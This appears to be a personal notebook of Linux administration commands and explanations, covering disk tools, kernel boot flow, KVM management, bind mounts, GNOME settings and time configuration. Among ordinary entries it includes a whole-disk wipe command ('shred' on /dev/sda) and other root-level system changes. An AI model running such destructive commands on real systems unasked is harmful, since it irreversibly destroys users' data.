       935,035,700      instructions              #    0.31  insn per cycle
                                                  #    4.69  stalled cycles per insn  (83.34%)
       192,287,010      branches                  #    4.792 M/sec                    (83.35%)
        11,734,554      branch-misses             #    6.10% of all branches          (83.33%)
==========

Ctrl-x, Ctrl-e : will bring up an $EDITOR containing whatever is currently entered into the prompt.
  "\C-x\C-e": edit-and-execute-command
Ctrl-Alt-e to expand any placeholders/variables in the current line.
  "\e\C-e": shell-expand-line

echo ~- # echo previous directory

#capture output of command into clipboard
"do stuff" | xsel -ib

kernel version numbering
example: 4.2.0-34
4: kernel version
2: major revision of the kernel version
0: minor revision of the kernel. It is only changed when new features or new drivers are added.
34: The fourth number represents corrections, such as security patches and bug (i.e., error) fixes

#show kernel drivers handling each device and also kernel modules capable of handling it.
lspci -kv
#check graphic driver
lspci -nnk |grep -iA2 vga

if the system hangs:
Hold down the ‘alt’ and ‘sysrq’ keys on your keyboard and whilst they are held down type the following slowly:
REISUB

#get SATA/IDE device info
hdparm /dev/sda
#show blocks occupied by a file
sudo hdparm --fibmap <filename>
example output:
file.txt:
 filesystem blocksize 4096, begins at LBA 1404430336; assuming 512 byte sectors.
 byte_offset  begin_LBA    end_LBA    sectors
           0 1869805696 1869805703          8
===

https://www.ostechnix.com/how-to-find-hard-disk-data-transfer-speed-in-linux/

sudo hdparm -t /dev/sda

/dev/sda:
 Timing buffered disk reads: 238 MB in  3.02 seconds =  78.93 MB/sec

----
sudo hdparm -t --direct /dev/sda #do not use buffer and read the data directly from the hdd

/dev/sda:
 Timing O_DIRECT disk reads: 246 MB in  3.01 seconds =  81.79 MB/sec

--
sudo hdparm -T /dev/sda
==>
/dev/sda:
 Timing cached reads:   4722 MB in  2.00 seconds = 2363.48 MB/sec

---
sudo hdparm -I /dev/sda
#then look for "R/W multiple sector transfer: Max = 16  Current = 0" under Capabilities
#this means HDD reads 16 sectors at a time

---
sudo hdparm -a /dev/sda #this means hdd can read 256 sectors in advance

/dev/sda:
 readahead     = 256 (on)
-----

sudo hdparm -M /dev/sda

/dev/sda:
 acoustic      = not supported
---
sudo hdparm -W /dev/sda

/dev/sda:
 write-caching =  1 (on)
---

badblocks : search a device for bad blocks
readelf: display info about ELF files

procfs: originally intended to expose process info, then became a big mess
sysfs: expose kernel info

kernel diff and patch:
#1 generate patch
diff -Naur -X linux-2.6.19/Documentation/dontdiff linux-2.6.19/ linux-2.6.19-dirty/ > my_patch
#2 apply patch
cd linux-2.6.19; patch -p1 < ../patch-2.6.20
# -p1 tells the patch command to skip 1 leading slashes from the filenames present in the patch file.

===========================
creating and applying patches:
diff -u hello.c hello_new.c > hello.patch
patch < hello.patch
patch -b < hello.patch #take a backup before applying patches
patch --dry-run < hello.patch #dry run
patch -R < hello.patch #reverse a patch

kernel entry point:
arch/x86/boot/header.S -> calll main

loop device is a pseudo ("fake") device (actually just a file) that acts as a block-based device. a file that contains a filesystem
loop device is a pseudo device that makes a file look like a block device. (command: losetup /dev/loop0 <filename>)

========= loop device =========
dd if=/dev/zero of=file.img bs=1k count=10000
losetup /dev/loop0 file.img
mkfs.ext4 -c /dev/loop0 10000
mount -t ext4 /dev/loop0 /mnt/point1
========= loop device =========

#system-wide limit on open file descriptors
cat /proc/sys/fs/file-max
#change limit:
/etc/security/limits.conf
/etc/sysctl.conf

from setrlimit (ulimit is a wrapper around setrlimit):
===
The soft limit is the value that the kernel enforces for the corresponding resource.  The hard limit
acts as a ceiling for the soft limit: an unprivileged process may set only its soft limit to a value
in the range from 0 up to the hard limit, and (irreversibly) lower its hard limit.  A privileged
process (under Linux: one with the CAP_SYS_RESOURCE capability) may make arbitrary changes to either
limit value.
---
hard limit: the maximum allowed to a user, set by the superuser/root. This value is set in the file
/etc/security/limits.conf. Think of it as an upper bound or ceiling or roof.
soft limit: is the effective value right now for that user. The user can increase the soft limit on
their own in times of needing more resources, but cannot set the soft limit higher than the hard
limit.

#time zone: display time
$ TZ="America/New_York" date
Tue Apr 19 10:51:17 EDT 2016
#time zone files: /usr/share/zoneinfo/

cat /etc/os-release

linux kernel startup:
#kernel entry point:
arch/x86/boot/header.S
#next
arch/x86/boot/main.c
#next
arch/x86/boot/pm.c
#next
arch/x86/boot/pmjump.S
#next entry point:
arch/x86/kernel/head_64.S
#next
arch/x86/kernel/head64.c -> x86_64_start_kernel() ->
#next
init/main.c -> start_kernel() -> rest_init() -> kernel_init()
                                             -> kernel/sched/idle.c: cpu_startup_entry() -> cpu_idle_loop()
kernel init:

#dump info file system and look at superblock
dumpe2fs /dev/sda6 | grep -i superblock

superblock is essentially file system metadata and defines the file system type, size, status, and
information about other metadata structures (metadata of metadata).
metadata about filesystem.
====
An inode exists in, or on, a file system and represents metadata about a file.
====
dentry (directory entry)
what the Linux kernel uses to keep track of the hierarchy of files in directories. Each dentry maps
an inode number to a file name and a parent directory.

#documentation in linux source: Documentation/sysctl/vm.txt
To free pagecache:
echo 1 > /proc/sys/vm/drop_caches
To free dentries and inodes:
echo 2 > /proc/sys/vm/drop_caches
To free pagecache, dentries and inodes:
echo 3 > /proc/sys/vm/drop_caches

#manipulate the real-time attributes of a process : chrt
#set or retrieve a process's CPU affinity : taskset

hardware interrupts:
/proc/interrupts:
first column: interrupt #
second column: how many times the CPU core has been interrupted
#from /proc/interrupts : i8042 is the keyboard controller
i8042 controller controls PS/2 keyboards and mice in PCs
smaller IRQ number means higher priority
=====
software interrupts: /proc/softirqs

/proc/stat : show interrupt count

/sys/devices/system/cpu

system performance tools:
mpstat
sar
iostat
pidstat
sadf
cifsiostat

interrupt CPU affinity value:
/proc/irq/<irq#>/smp_affinity  #this is a mask
/proc/irq/<irq#>/smp_affinity_list #this is the cpu number

showkey #show linux key code
xev #show X11 key code

block device: data move in blocks. support buffering and random access. accessed randomly
sector: smallest addressable unit on a block device. a physical property of the device,
  the smallest unit of transfer for the device.
block: smallest addressable unit in a filesystem, smallest unit of transfer for a block device driver.
block size must be a power of two and cannot be larger than a page frame. must be a multiple
of the sector size.
each block requires its own buffer, which is a region of RAM used by the kernel to store
the block's content.
============
character device: data is streamed character by character. accessed as a stream of data.

linux has two disk caches: buffer cache and page cache
buffer cache and page cache have been combined.

/proc/filesystems

software interrupt (SoftIRQ)
processes: ksoftirqd/0 , etc
software interrupts are kernel routines that are scheduled to run at a time when other
tasks will not be interrupted.

When a NIC receives incoming data, it copies the data into kernel buffers using DMA.
The NIC notifies the kernel by means of a hardware interrupt. These interrupts do minimal
work as they have already interruptted another task and cannot be interruptted themselves.
Software interrupts then drain the network adapter receive ring buffers.
protocol handlers then process the data. finally, data is delivered to a socket
buffer where an application can call the receive function.

networking info:
/proc/net/dev
/proc/net/tcp
/proc/net/unix
/proc/net/snmp

networking tools:
dropwatch
ip
ethtool

load: # of processes using or waiting for the CPU.
load: # of processes waiting to be served by CPU.
load average: the load averaged over 1,5,15 minutes
/proc/loadavg

parted /dev/sda print

net: Tool for administration of Samba and remote CIFS servers.
mtr: a network diagnostic tool
iptables: firewall
mrtg - multi router traffic grapher

load balancing tool: pen, pound, balance

snort - flexible Network Intrusion Detection System

============
monitor SMART disk: smartctl and smartd
smartctl -i /dev/sda #info
smartctl -a /dev/sda #all info
smartctl -x /dev/sda #even more info
smartctl -H /dev/sda #health info
smartctl -l selftest /dev/sda

#available test: offline, short, long, conveyance
smartctl -a:
Pre-fail: if the VALUE column is below the THRESH column, be concerned

#run test
smartctl -t short /dev/sda
smartctl -t long /dev/sda

#abort test
smartctl -X

#show capability:
smartctl -c /dev/sda
===================

rootkit: a software package that enables an unauthorized user to obtain
root privileges

#find processes using files/sockets
fuser -v -m <filesystem> #filesystem can be specified as directory name or /dev/sda1
OR:
lsof /dev/sdc1

gpart: guess partition table. used for recovery

gddrescue: clone bad disk
partimage: clone disks, does not support ext4, don't use
fsarchiver: support ext4, use this instead of partimage

lost+found: store files whose actual locations cannot be determined
lost+found: store recovered bits of corrupted files.
during a filesystem consistency check.
details:
fsck might find data that looks like a complete file but doesn't have a name on the system — an
inode with no corresponding file name. This data is still using up space, but it isn't accessible by
any normal means.
--
For example, if you abruptly shut your computer down while it’s running and files are being written
to the hard drive, the fsck tool may automatically examine your file system the next time you boot
your computer. If it finds any corrupted data, it places it in the file system’s lost+found folder.

recover deleted files:
unmount the partition (go to single user mode if necessary)
need to know what you're looking for, do a grep on the device:
grep -a -B10 -A100 -i <pattern> /dev/sda2 > file.out
#-a: treat the device as a series of ascii char

shred: overwrite a file with random data, can be used on devices too:
shred -n 3 -vz /dev/sda
shred -zvu tecmint.pdf
# -z: adds a final overwrite with zeros to hide shredding.
# -u: helps to truncate and remove file after overwriting.
# -v: verbose

autopsy - graphical interface to SleuthKit
sleuthkit - tools for forensics analysis on volume and filesystem data

#burn cd/dvd
growisofs (preferred?)
example: growisofs -dvd-compat -Z /dev/sr0=isoimage.iso
wodim

#mounting an ISO image
mount -t iso9660 -o ro,loop /path/to/file.iso /mount-point

isosize : show the size of an iso9660 filesystem

mountpoint: check whether a directory is a mount point

extended attributes are name/value pairs associated with a file. a form of metadata
need to configure kernel: FS_XATTR
need to configure fstab
applications: attr, getfattr, setfattr

/etc/default/console-setup
#change console font:
dpkg-reconfigure console-setup #this will change /etc/default/console-setup
then run setupcon in virtual console
the fonts are in: /usr/share/consolefonts/
setfont Uni2-TerminusBold24x12
in /etc/default/console-setup:
FONTFACE="TerminusBold"
FONTSIZE="12x24"
=============
The font size is specified by 2 numbers in pixels represented as HEIGHT x WIDTH. If the width is 8
pixels, then only the height is specified. For comparison purposes, the default console font size is
16 (that is, 16 x 8).
-----
showconsolefont

tune2fs : adjust filesystem parameters
#list content of superblock, etc
tune2fs -l /dev/sda6
#set label
tune2fs -L <label> /dev/sda6
#similar to
dumpe2fs -h /dev/sda6
#show/set filesystem volume label
sudo e2label /dev/sda5
=====
tune2fs:  -m reserved-blocks-percentage (defaul: 5)
#reduces the reserved area to 2% of the filesystem, which may be more
tune2fs -m 2 /dev/sda1
#sets the filesystem to have no reserved blocks,
tune2fs -r 0 /dev/sda1
---
sudo tune2fs -l /dev/sda5 | grep -i reserved
==>
Reserved block count:     1177586
Reserved block count x Block size = amount in Bytes
https://www.redhat.com/sysadmin/disk-space

partprobe - inform the OS of partition table changes

DRM (direct rendering manager): a subsystem of the kernel responsible for
interfacing with GPU of video cards.
each GPU is a DRM device: /dev/dri/card0
DRM interface with GPU and graphics RAM
KMS interface with display controller, which interface with monitor screen

linux framebuffer: fbdev , /dev/fb0
allow access to graphics hardware through an API
The Linux framebuffer (fbdev) is a graphic hardware-independent abstraction layer to show graphics on a computer monitor, typically on the console.

Text mode is a computer display mode in which content is internally represented on a computer screen
in terms of characters rather than individual pixels.

restart X server:
#1: crude: kill -USR2 <pid of x server>
#2: better: systemctl restart lightdm

#length of command line

The limit for the length of a command line is not imposed by the shell, but by the operating
system. POSIX denotes this limit ARG_MAX and on POSIX conformant systems you can query it with
$ getconf ARG_MAX
====
According to POSIX: http://pubs.opengroup.org/onlinepubs/009695399/basedefs/limits.h.html
Maximum length of argument to the exec functions. This means: Without calling exec, there is no
ARG_MAX limitation. So it would explain why shell builtins are not restricted by ARG_MAX.

===== curl post with file =====
curl -F "data=@post.data"
the string looks like this:
--------------------------73e6530ff229c469
Content-Disposition: form-data; name="data"; filename="post.data"
Content-Type: application/octet-stream

{"rels": [{"from_vsid": "KTX1-OBU-099-South-HKG01-1", "to_vsid": "PHKG-7JY-057-North-GUX02-1", "rel_type": "TERMINALTRANSFERLEG_HOT"}]}

--------------------------73e6530ff229c469--
===========================

kvm daemon: libvirt-bin, libvirt-guests
== need to do this:
sudo systemctl start libvirtd virtlogd.service
kvm-ok #sanity check
virsh -c qemu:///system list
OR
virsh -c qemu:///system list --all
OR
virsh list --all
#the name column of virsh list is the domain name
===
default location of kvm images: /var/lib/libvirt/images
=== customize image location:
/etc/libvirt/storage/default.xml (use virsh pool-edit default)
--- storage pool
virsh pool-dumpxml default
virsh pool-edit default
virsh pool-list --all
virsh pool-info default
virsh pool-destroy domain
virsh pool-undefine domain
-----
change default location for images:
1. virsh pool-edit default
2. systemctl restart libvirtd
3. virsh pool-dumpxml default #to confirm
====
GUI : virt-manager
----
dump domain info: virsh dumpxml <domain-name>
----
virsh list --with-managed-save --all
virsh list --without-managed-save --all
virsh start foo --console
virsh reboot foo
virsh shutdown foo
virsh suspend foo
virsh resume foo
virsh console foo
virsh edit foo
virsh define foo
virsh snapshot-list foo
virsh ttyconsole foo
==== to delete VM
virsh destroy foo #domain needs to be running
virsh undefine foo
#delete the image manually (<domain-name>.qcow2)
----
for undefine: You can also specify --managed-save to delete any managed save images and --snapshots-metadata to
remove snapshots for the specified VM.
----
after move images:
virsh edit domainID
change: <source file='/mnt/raid/images/rh-5.5.qcow2'/>
===
arch linux: change KVM config:
video mode was qxl, change to virtio
===
virsh net-list --all
virsh net-dumpxml default

in /boot/grub/grub.cfg : add console=ttyS0 in guest VM
then you can "virsh console foo"

================================

bind mount: remount part of a file hierarchy elsewhere: mount --bind olddir newdir
after this, the same contents are available in two places.
===
if there are mount points under olddir, their contents are not visible under newdir unless use --rbind
use mount --rbind olddir newdir #replicate mount points under olddir
=== BEST:
A bind mount is an alternate view of a directory tree.
bind mount provides a view of a directory tree at a different location.
====
Classically, mounting creates a view of a storage device as a directory tree. A bind mount instead
takes an existing directory tree and replicates it under a different point. The directories and
files in the bind mount are the same as the original. Any modification on one side is immediately
reflected on the other side, since the two views show the same data.
=========
The alternative (classic) way to create a read-only bind mount is to use remount operation, for example:
mount --bind olddir newdir
mount -o remount,ro,bind olddir newdir
========================
when you mount a filesystem on a directory, this hides what is behind the directory. The files
in the directory become inaccessible until the directory is unmounted.
========
filesystem: a collection of files and directories in a hierarchy.
mounting: adding a filesystem to the global namespace of files and directories

Filesystem in Userspace (FUSE) is a software interface for Unix-like computer operating systems that
lets non-privileged users create their own file systems without editing kernel code. This is
achieved by running file system code in user space while the FUSE module provides only a "bridge" to
the actual kernel interfaces.

espeak : software speech synthesizer

segments of a program:
text segment: contain the executable code and read-only data
initialized data segment: contain initialized data
uninitialized data segment (bss): contain uninitialized data
stack segment

connect android to usb port: use MTP
mount point: /run/user/<userid>/gvfs

demand load executables: only those parts of a program required for execution are loaded into memory.
when a new process is created using fork(), memory is not requested, but instead the memory
for the parent process is used jointly by both processes. if the new process accesses part of the
memory in write mode, this section is copied before being modified: copy-on-write

/dev/mem is a character device file that is an image of the main memory of the computer.

blockdev --getss #sector size
blockdev --getbsz #block size

TZ=UTC date # get a date in UTC or: date -u
#convert epoch second to a date in UTC
TZ=UTC date --date=@1452832200
#convert epoch second to a date in UTC (ISO format)
TZ=UTC date --date=@1452832200 +%Y-%m-%dT%H:%M:%S.000Z
output: 2016-01-15T04:30:00.000Z
#convert date to epoch second
TZ=UTC date --date="2015-08-31 13:30:15" +%s
#past date
date --date='2 days ago'
#future date
date --date='2 days'
== get time in milliseconds
date +%s%3N
--
TZ=America/New_York date

date +%V #ISO week number

getconf PAGESIZE #get page size

pcmanfm --desktop-pref

setxkbmap: set keyboard using X extension
setxkbmap -print -verbose 10
setxkbmap -option keypad:pointerkeys
setxkbmap -query

gsettings set org.gnome.desktop.a11y.keyboard mousekeys-enable false
gsettings get org.gnome.desktop.a11y.keyboard mousekeys-enable

lxpanelctl : (menu/run/config/restart)

scrot -cu -d 5

gnome-system-monitor


There are three different kinds of buffering strategies:
Characters written to or read from an unbuffered stream are transmitted individually to or from the file as soon as possible.
Characters written to a line buffered stream are transmitted to the file in blocks when a newline character is encountered.
Characters written to or read from a fully buffered stream are transmitted to or from the file in blocks of arbitrary size.
===
Newly opened streams are normally fully buffered, with one exception: a stream connected to an
interactive device such as a terminal is initially line buffered.
===
The use of line buffering for interactive devices implies that output messages ending in a newline
will appear immediately—which is usually what you want. Output that doesn’t end in a newline might
or might not show up immediately, so if you want them to appear immediately, you should flush
buffered output explicitly with fflush.
===
stdin : always buffered
stderr: always unbuffered
stdout: if terminal, then line-buffered, else unbuffered

stdbuf: modify buffering operations for streams
example: tail -f file | cut -d ' ' -f1 | uniq
nothing because the output of cut is buffered

tail -f access.log | stdbuf -oL cut -d ' ' -f1 | uniq
#use stdbuf -o0 if the data is not line-oriented
this will disable output buffering for the cut program

logical volume: a filesystem that appears to be a single physical volume,
but is actually assembled from space that has been allocated on multiple
physical partitions.

linux process and thread=======
process descriptor: struct task_struct
	pid_t pid; // this is the thread id
	pid_t tgid; // this is the process id

when a new process is created, it appears as a thread where both the PID and TGID are the same (new)
number.
When a thread starts another thread, that started thread gets its own PID (so the scheduler can
schedule it independently) but it inherits the TGID from the original thread.
====
getpid() returns tgid
gettid() returns pid
==========================

bash testing:
[ "$VAR" ] is equivalent to [ -n "$VAR" ] # true if not empty

power management tool: tlp, powertop

cpufrequtils (package): cpufreq-info command

core dump setting:
ulimit -c
cat /proc/sys/kernel/core_pattern
---
sysctl:
kernel.core_pattern = |/usr/lib/corekeeper/dump %d %u %p-%u-%g-%s-%t-%h-%E.core
kernel.core_pipe_limit = 0
kernel.core_uses_pid = 1

gcore - Generate a core file of a running program

useful commands from moreutils:
combine, errno, ifdata, isutf8, sponge, ts, vidir, vipe, zrun
===
example: sort myfile.txt | sponge myfile.txt

nice -n 19 <program>
renice -n 19 <pid>
ionice -c 3 cp bigfile.mp4 backup.mp4

take a screen shot of a video at 5:12 into the video
mplayer -vo png -ss 5:12 -frames 1 my-video.mp4

hide your processes from other users:
after this command, only my processes are under /proc
$ mount -o remount /proc -o hidepid=2

get location of IP address
curl ipinfo.io/216.58.192.4

mplayer -vo aa MovieName.avi #black and white
mplayer -vo caca MovieName.avi #color
====
exif image_name.jpg
====
mp3info music_file.mp3
====
convert original.jpg -resize 50% -quality 95 smaller.jpg #shrink by 50%
convert original.jpg -resize 200% -quality 95 bigger.jpg #enlarge
convert ships.jpg -rotate 30 tilt-ships.jpg #rotate
convert ships.jpg -background none -rotate 90 turn-ships.jpg #rotate
== make a banner
convert -background white -fill blue -font Courier -pointsize 32 label:'Happy Birthday' banner.jpg
== read text from a file
convert -background white -fill black -font Courier -pointsize 12 label:@message.txt banner.gif
== save command output to an image
ifconfig | convert label:@- myipaddress.png
== save command output to an existing image and create a new image
convert -font -misc-fixed-*-*-*-*-*-*-*-*-*-*-*-* -fill black -draw "text 270,260 \" `ip addr` \"" Linux.jpg myipaddress.jpg

record your desktop session (video)
# -s : resolution, alternative: -s 1024x768
ffmpeg -f x11grab -s wxga -r 25 -i :0.0 -sameq ~/my_video.mpg
## cut video
ffmpeg -i in.mp4 -ss [start] -t [duration] -c copy out.mp4
OR
ffmpeg -i in.mp4 -ss [start] -to [stop] -c copy out.mp4

# print sensors info
sensors

cgroups (control groups): allow you to set limits on resources for processes and their children.

mount namespace: make it look like you have the entire filesystem namespace
UTS (unix time sharing) namespace: make it look like you have your own hostname and domain name.
IPC namespace: you have your own message queues
PID namespace: you have your own process ID
network namespace: you have your own network devices
user namespace: you have your own user id

apparmor: kernel enhancement to confine programs to a limited set of resources
program: apparmor_status

#show networking info
networkctl list
network-admin

iwconfig : configure wireless network interface

chvt # change virtual console, has to run inside text-based virtual console

#capture screenshot
import -display :0.0 -window root sshot1.png

alias dos2unix='recode dos/CR-LF..l1'
alias unix2dos='recode l1..dos/CR-LF'
alias unix2win='recode l1..windows-1250'

#turn off ping replies
sysctl -w net.ipv4.icmp_echo_ignore_all=1
#slow down ping reply rate
sysctl -w net.ipv4.icmp_echoreply_rate=10

#lxterminal icons
/usr/share/icons/Lubuntu/apps/22/lxterminal.svg
/usr/share/icons/Lubuntu/apps/48/lxterminal.svg
/usr/share/icons/Lubuntu/apps/16/lxterminal.svg
/usr/share/icons/Lubuntu/apps/24/lxterminal.svg

#silence the beep
setterm -blength 0
setterm --dump #dump contents of virtual console, default file name: screen.dump
setterm --inversescreen on|off

By default, Linux uses the atime option on a disk mount, which means it writes a timestamp (e.g. a
write to the drive) every time it reads anything. So in this case, reads cause writes – and also
disk seeks, because a read from a file will then trigger having to write to the directory that
contains the file. This even occurs if a file is read from the file system’s page cache (reading
from the machine’s memory rather than the drive).
====
you can use the relatime option instead, which only writes a timestamp
when a file or directory is written to.
==
as of kernel 2.6.30, relatime is the default

#temporary filesystem
mkdir /ramdisk
mount none -t tmpfs -o size=256M /ramdisk

ss : display socket info
ss -t : display tcp info
ss -lt : display tcp listening
arping: send ARP request to a neighbor: arping -I eth0 192.188.1.1
ethtool

/sys/class/leds/<name>/trigger

modinfo radeon | grep description

#get module parameters
/sys/module/<mod_name>/parameters

#sort the output while keeping the header at the top
df -hP | awk 'NR==1;NR>1{print|"sort -k5rn"}'

nsswitch.conf - Name Service Switch configuration file
determine the order in which various name resolution services will be tried
--
getent : get entries from the name service switch library
getent hosts

GConf: store configuration settings. similar to Windows registry. deprecated.
GConf: to be replaced by GSettings and dconf
===
dconf is a low-level configuration system. Its main purpose is to provide a backend to GSettings on
platforms that don't already have configuration storage systems.
---
Gsettings is a development library used to read and write to a configuration store backend. On
Linux, it uses Dconf, but on Windows, it uses the registry, and on OS X, it uses a native data
store.
-- bottom line: don't use dconf directly. use GSettings
gsettings list-schemas
#show all keys and values
gsettings list-recursively org.gnome.settings-daemon.plugins.media-keys
#after you find the schema, org.gnome.GWeather is a schema name
gsettings list-keys org.gnome.GWeather
#compare to following
gsettings list-recursively  | grep org.gnome.GWeather
#get the value of a key
gsettings get org.gnome.GWeather default-location
---
relocatable schemas need an aditional path before we can list and manipulate the keys. Other than
the path we treat the the two types of schemas the same way from the command line.
$ gsettings list-recursively org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/
-->
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding binding ''
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding command ''
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding name ''
===========
$ gsettings list-recursively org.gnome.settings-daemon.plugins.media-keys.custom-keybinding:/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/
-->
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding binding '<Primary><Super>m'
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding command 'wmctrl -a chrome'
org.gnome.settings-daemon.plugins.media-keys.custom-keybinding name 'Raise chrome'
==
$ gsettings get org.gnome.settings-daemon.plugins.media-keys custom-keybindings
-> ['/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom1/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom3/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom4/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom5/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom6/']
===
$ gsettings set org.gnome.settings-daemon.plugins.media-keys custom-keybindings "['/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom1/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom3/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom4/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom5/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom6/']"
===
#checking
ubuntu 18.04, gnome shell load kb shortcut:
1. dconf load / < <file>
2. gsettings set org.gnome.settings-daemon.plugins.media-keys custom-keybindings "['/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom0/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom1/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom2/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom3/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom4/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom5/', '/org/gnome/settings-daemon/plugins/media-keys/custom-keybindings/custom6/']"
---
GUI: dconf-editor
---
default: use $XDG_CONFIG_HOME/dconf/user
#use a different file: /tmp/dconf/user
XDG_CONFIG_HOME=/tmp dconf dump /
dconf dump /
dconf load / < file
------
get certain settings from some dconf/user to another dconf/user
1. put the file in /tmp/dconf/user
2. XDG_CONFIG_HOME=/tmp dconf dump / > old.txt
3. edit old.txt
3. dconf load / < old.txt

#list files that do not match a pattern
ls !(one)
ls !(one|two)

isoinfo -i <iso-file> -l #list content
isoinfo -i <iso-file> -x <file> #extract file

time zone:
ln -s /usr/share/zoneinfo/America/Los_Angeles /etc/localtime

hwclock --systohc #generate the /etc/adjtime file
-- when setting hwclock, need to indicate wheter --utc or --localtime
hwclock --debug #can show whether hw clock is in local time or UTC
3rd line of /etc/adjtime: indicate whether hw clock is in local time or UTC

edit locale info in /etc/locale.gen, then run command locale-gen

hostnamectl status
hostnamectl set-hostname myhostname

nroff and troff are UNIX commands (and the utilities that support them) for formatting text files
for printing. nroff is designed for formatting output for line printers and letter-quality
printers. troff is designed for formatting output for typesetters. troff contains some special
functions that apply only to typesetters; otherwise, the commands are identical and either can be
used.
===
Groff is the GNU replacement for the troff and nroff text formatters.

kbd_mode : report/set keyboard mode of console
kbdrate: set keyboard repeat and delay time
kbdinfo: obtain info about console
kbdinfo getmode: text/graphics
kbdinfo gkbmode: unicode
kbdinfo gkbled: scrolllock, numlock, capslock
unicode_start : put keyboard and console in unicode mode
---
keymap: the mapping between the key pressed and the characer used by the computer

console: console is in utf8 mode, so program output is utf8 (8-bit values)
a translation table maps 8-bit values to 16-bit unicode values. such translation table
is called unicode console map. the kernel then uses the 16-bit unicode value to choose
the right glyph from the font file and display it.
setfont -m : used to specify a unicode console map
===
font file also contains Unicode mapping table, which maps a Unicode value to each glyph
setfont -u : used to specify a unicode mapping table

localectl status
localectl list-keymaps
localectl list-locales
locale -k LC_TIME
locale -a
--
https://www.tecmint.com/set-system-locales-in-linux/

for virtual console: keyboard translation table commands: dumpkeys, loadkeys, showkey
--
dumpkeys > backup.kmap #save current keymap
loadkeys backup.kmap #restore keymap
showkey #check which key code is assigned

brctl show : show ethernet bridge

/etc/securetty

The configuration file for DNS resolvers is /etc/resolv.conf
The resolver is a set of routines in the C library that provide access to the Internet Domain Name
System (DNS).

A Linux system actually has two clocks: One is the battery powered "Real Time Clock" (also known as
the "RTC", "CMOS clock", or "Hardware clock") which keeps track of time when the system is turned
off but is not used when the system is running. The other is the "system clock" (sometimes called
the "kernel clock" or "software clock") which is a software counter based on the timer interrupt. It
does not exist when the system is not running, so it has to be initialized from the RTC (or some
other time source) at boot time. References to "the clock" in the ntpd documentation refer to the
system clock, not the RTC.

ntp -p : show NTP status
ntptime

network bridge: sw/hw that combines two or more network segments. it behaves like
a virtual network switch.
bridge is a way to connect two Ethernet segments in a protocol-independent way. packets are
forwarded based on Ethernet address, rather than IP address.

/etc/default/rcS: UTC=no/yes #assume real-time clock in UTC or not
/etc/default/rcS: variables that affect the behavior of boot scripts

tzselect : select time zones interactively

hardware clock (aka real time clock, RTC)
by default, Windows think RTC is in local time.
This can be changed in the registry:
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TimeZoneInformation]
"RealTimeIsUniversal"=dword:00000001
== make following changes in home laptop:
1. check BIOS time
2. Windows: change registry
3. boot, set BIOS time to UTC
4. boot into Windows, verify time
5. reboot, check BIOS time
6. boot into Windows, verify time again
7. reboot, check BIOS time again
8. then reboot from USB/CD (linux)
9. mount /dev/sdaX, change /etc/default/rcS (UTC=yes) and /etc/adjtime (change LOCAL to UTC)
10. boot into Linux, verify time
11. reboot, check BIOS time, go to Linux, verify time again
=====
write UTC to RTC (hwclock --systohc --utc)
== window time service?
windows: sc config w32time start=disabled/demand ??

Linux : 11 minute mode: CONFIG_GENERIC_CMOS_UPDATE compiler option
the kernel copies the system time to the hardware clock every 11 minutes
this mode is useful when NTP is running

POSIX character classes
[:upper:]	[A-Z]	uppercase letters
[:lower:]	[a-z]	lowercase letters
[:alpha:]	[A-Za-z]	upper- and lowercase letters
[:digit:]	[0-9]	digits
[:xdigit:]	[0-9A-Fa-f]	hexadecimal digits
[:alnum:]	[A-Za-z0-9]	digits, upper- and lowercase letters
[:punct:]		punctuation (all graphic characters except letters and digits)
[:blank:]	[ \t]	space and TAB characters only
[:space:]	[ \t\n\r\f\v]	blank (whitespace) characters
[:cntrl:]		control characters
[:graph:]	[^ [:cntrl:]]	graphic characters (all characters which have graphic representation)
[:print:]	[[:graph] ]	graphic characters and space

sudo linux-boot-prober /dev/sda4
->
/dev/sda4:/dev/sda4::/boot/vmlinuz-linux:/boot/initramfs-linux.img:root=/dev/sda4
---
$ sudo os-prober
/dev/sda1:Windows 7:Windows:chain
/dev/sda2:Windows Recovery Environment:Windows1:chain
/dev/sda4:Windows Recovery Environment:Windows2:chain

rmmod pcspkr #disable PC speaker

setterm : set terminal attribute

127.0.1.1: the purpose is to assign an IP to a host name in the absence of a network
connection. If the machine has a permanent IP address, use it instead of 127.0.1.1

resize partition:
checking: e2fsck -f /dev/sda1, dumpe2fs -h /dev/sda1
enlarge: extend partition, then resize file system
shrink:
resize filesystem: resize2fs /dev/sda1 1000s # 1000s specify 1000 sectors
afterwards, run e2fsck and dumpe2fs to check
shrink partion: use parted:
resizepart 1 10547s #1 is partition number and 10547s is the ending sector:
afterwards:
/dev/sdb1        2048 10547    8500  4.2M 83 Linux
==
afterwards, run blkid to check partition UUID

scrollback buffer: between video adapter and the display device
change scrollback buffer size: provide fbcon=scrollback:Nk where N is the buffer size
